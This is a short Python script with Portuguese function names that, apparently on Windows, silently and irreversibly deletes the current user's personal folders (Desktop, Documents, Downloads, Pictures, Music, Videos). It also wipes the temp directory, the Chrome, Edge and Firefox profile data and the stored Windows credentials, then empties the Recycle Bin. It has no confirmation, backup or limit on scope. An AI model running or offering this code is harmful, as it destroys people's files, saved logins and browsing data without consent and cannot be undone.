import os
import shutil
import getpass
import tempfile
import ctypes

def deletar_conteudo_pasta(caminho):
    if os.path.exists(caminho):
        for item in os.listdir(caminho):
            item_path = os.path.join(caminho, item)
            try:
                if os.path.isfile(item_path) or os.path.islink(item_path):
                    os.unlink(item_path)
                elif os.path.isdir(item_path):
                    shutil.rmtree(item_path)
            except Exception as e:
                print(f"Erro ao deletar {item_path}: {e}")

def limpar_lixeira():
    ctypes.windll.shell32.SHEmptyRecycleBinW(None, None, 0)

def limpar_navegadores(usuario):
    base = f"C:\\Users\\{usuario}\\AppData\\Local"

    caminhos = [
        base + "\\Google\\Chrome\\User Data",
        base + "\\Microsoft\\Edge\\User Data",
        f"C:\\Users\\{usuario}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles"
    ]

    for caminho in caminhos:
        print(f"Limpando navegador: {caminho}")
        shutil.rmtree(caminho, ignore_errors=True)

def limpar_credenciais(usuario):
    cred_path = f"C:\\Users\\{usuario}\\AppData\\Local\\Microsoft\\Credentials"
    shutil.rmtree(cred_path, ignore_errors=True)

def main():
    usuario = getpass.getuser()
    base_path = f"C:\\Users\\{usuario}"

    pastas = ["Desktop", "Documents", "Downloads", "Pictures", "Music", "Videos"]

    for pasta in pastas:
        deletar_conteudo_pasta(os.path.join(base_path, pasta))

    deletar_conteudo_pasta(tempfile.gettempdir())
    limpar_navegadores(usuario)
    limpar_credenciais(usuario)
    limpar_lixeira()

    
if __name__ == "__main__":
    main()